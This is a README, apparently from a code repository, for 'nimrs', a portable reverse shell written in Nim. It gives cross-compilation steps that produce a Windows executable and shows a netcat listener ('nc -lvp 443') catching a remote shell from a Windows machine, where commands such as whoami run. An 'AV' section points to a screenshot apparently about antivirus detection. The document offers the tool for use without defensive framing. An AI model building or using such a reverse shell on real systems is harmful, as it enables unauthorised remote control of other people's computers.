# nimrs

portable nim (nim-lang) reverse shell 

**Supports**

Windows, Linux, MacOS

https://nim-lang.org/

**Install**

https://nim-lang.org/install.html

**Cross Compile**

https://nim-lang.org/docs/nimc.html

> Cross compilation for Windows
>
> To cross compile for Windows from Linux or macOS using the MinGW-w64 toolchain:
> 
> nim c -d:mingw myproject.nim
>
> Use --cpu:i386 or --cpu:amd64 to switch the CPU architecture.
> 
> The MinGW-w64 toolchain can be installed as follows:
> 
> Ubuntu: apt install mingw-w64
>
> CentOS: yum install mingw32-gcc | mingw64-gcc - requires EPEL
>
> OSX: brew install mingw-w64

```
WOPR@WOPR nimrs % Nim/bin/nim c -d:mingw --cpu:i386 nimrs.nim
Hint: used config file '/private/var/tmp/nimrs/Nim/config/nim.cfg' [Conf]
Hint: used config file '/private/var/tmp/nimrs/Nim/config/config.nims' [Conf]
Hint: system [Processing]
Hint: widestrs [Processing]
Hint: io [Processing]
Hint: nimrs [Processing]
Hint: net [Processing]
Hint: nativesockets [Processing]
Hint: os [Processing]
Hint: strutils [Processing]
Hint: parseutils [Processing]
Hint: math [Processing]
Hint: bitops [Processing]
Hint: macros [Processing]
Hint: algorithm [Processing]
Hint: unicode [Processing]
Hint: pathnorm [Processing]
Hint: osseps [Processing]
Hint: winlean [Processing]
Hint: dynlib [Processing]
Hint: times [Processing]
Hint: options [Processing]
Hint: typetraits [Processing]
Hint: time_t [Processing]
Hint: sets [Processing]
Hint: hashes [Processing]
Hint: monotimes [Processing]
Hint: osproc [Processing]
Hint: strtabs [Processing]
Hint: streams [Processing]
Hint: cpuinfo [Processing]
Hint: operation successful (50561 lines compiled; 0.711 sec total; 58.539MiB peakmem; Debug Build) [SuccessX]
WOPR@WOPR nimrs % file nimrs.exe 
nimrs.exe: PE32 executable (console) Intel 80386, for MS Windows
```

**Usage**

Edit nimrs.nim. 

```
root@kali:~# nc -lvp 443
listening on [any] 443 ...
192.168.116.173: inverse host lookup failed: Unknown host
connect to [192.168.116.199] from (UNKNOWN) [192.168.116.173] 50531
whoami
Microsoft Windows [Version 10.0.17763.379]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\IEUser\Downloads>whoami & echo DONEDONE
msedgewin10\ieuser

```

**AV**

<img width="1342" alt="Screenshot 2019-12-06 at 05 43 36" src="https://user-images.githubusercontent.com/56988989/70299149-fd247600-17eb-11ea-88e8-e63dc5d57364.png">


Enjoy~
